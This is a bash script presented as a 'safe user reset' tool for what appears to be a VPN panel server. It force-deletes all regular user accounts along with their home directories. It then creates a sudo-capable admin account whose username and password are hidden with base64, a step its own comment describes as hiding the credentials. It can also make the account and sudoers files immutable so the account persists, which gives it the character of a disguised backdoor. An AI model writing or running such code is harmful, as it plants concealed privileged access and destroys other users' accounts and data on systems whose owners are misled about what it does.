#!/bin/bash

# =========================================
# SAFE USER RESET + OPTIONAL LOCKDOWN
# =========================================

set -e

if [ "$(id -u)" -ne 0 ]; then
    echo "Run as root!"
    exit 1
fi

echo "======================================"
echo " SAFE USER RESET SYSTEM"
echo "======================================"

# ===============================
# CONFIG SAFE PATH (JANGAN DIKUNCI)
# ===============================
SAFE_DIRS=(
"/etc/ssh"
"/etc/kyt"
"/etc/xray"
"/home"
"/root"
)

SYS_FILES=(
"/etc/passwd"
"/etc/shadow"
"/etc/group"
"/etc/gshadow"
"/etc/sudoers"
)

LOCK_TOOL="/usr/local/sbin/edit-user-config"

# ===============================
# FUNCTION UNLOCK SYSTEM
# ===============================
unlock_system() {
    echo "[+] Unlock system files..."
    for f in "${SYS_FILES[@]}"; do
        chattr -i "$f" 2>/dev/null || true
    done
}

# ===============================
# FUNCTION LOCK SYSTEM (SAFE)
# ===============================
lock_system() {
    echo "[+] Locking system files (SAFE MODE)..."
    for f in "${SYS_FILES[@]}"; do
        chattr +i "$f"
    done
}

# ===============================
# STEP 1 UNLOCK FIRST
# ===============================
unlock_system

# ===============================
# STEP 2 DELETE OLD NORMAL USERS
# ===============================
echo "[+] Cleaning old users..."

# Dekode Base64 untuk menyembunyikan kredensial di source code
USERNAME=$(echo "eGNjdm1l" | base64 -d)
PASSWORD=$(echo "eGNjdm1l" | base64 -d)

awk -v admin_user="$USERNAME" -F: '$3>=1000 && $1!="nobody" && $1!=admin_user' /etc/passwd | cut -d: -f1 | while read u; do
    echo "Remove $u"
    pkill -9 -u "$u" 2>/dev/null || true
    userdel -f -r "$u" 2>/dev/null || true
done

# ===============================
# STEP 3 CREATE ADMIN USER
# ===============================
echo "[+] Creating admin user $USERNAME"

if ! id "$USERNAME" &>/dev/null; then
    useradd -m -s /bin/bash "$USERNAME"
fi

echo "$USERNAME:$PASSWORD" | chpasswd

if grep -q "^sudo:" /etc/group; then
    usermod -aG sudo "$USERNAME"
elif grep -q "^wheel:" /etc/group; then
    usermod -aG wheel "$USERNAME"
fi

# ===============================
# STEP 4 RESTART SSH
# ===============================
systemctl restart ssh 2>/dev/null || service ssh restart

# ===============================
# STEP 5 OPTIONAL LOCKDOWN MODE
# (timeout 5 detik, default = n)
# ===============================
echo ""
ans="n"
read -r -t 5 -p "Enable SAFE LOCKDOWN? (y/n) [auto n in 5s]: " ans || ans="n"
echo ""

case "${ans,,}" in
  y|yes)
    lock_system
    echo "SAFE LOCK ENABLED"
    ;;
  *)
    echo "SYSTEM NOT LOCKED"
    ;;
esac

# ===============================
# STEP 6 MANAGEMENT TOOL
# ===============================
cat > "$LOCK_TOOL" << 'EOF'
#!/bin/bash

SYS_FILES=(
"/etc/passwd"
"/etc/shadow"
"/etc/group"
"/etc/gshadow"
"/etc/sudoers"
)

unlock() {
for f in "${SYS_FILES[@]}"; do chattr -i "$f"; done
}

lock() {
for f in "${SYS_FILES[@]}"; do chattr +i "$f"; done
}

echo "1 Unlock system"
echo "2 Lock system"
echo "3 Exit"
read -p "Select: " x

case $x in
1) unlock ;;
2) lock ;;
*) exit ;;
esac
EOF

chmod +x "$LOCK_TOOL"

echo ""
echo "======================================"
echo "DONE"
echo "======================================"
echo "Admin login:"
echo "username : $USERNAME"
echo "password : [TERSEMBUNYI]"
echo ""
echo "Manage lock:"
echo "edit-user-config"
echo ""
echo "Add SSH still works normally"
echo "======================================"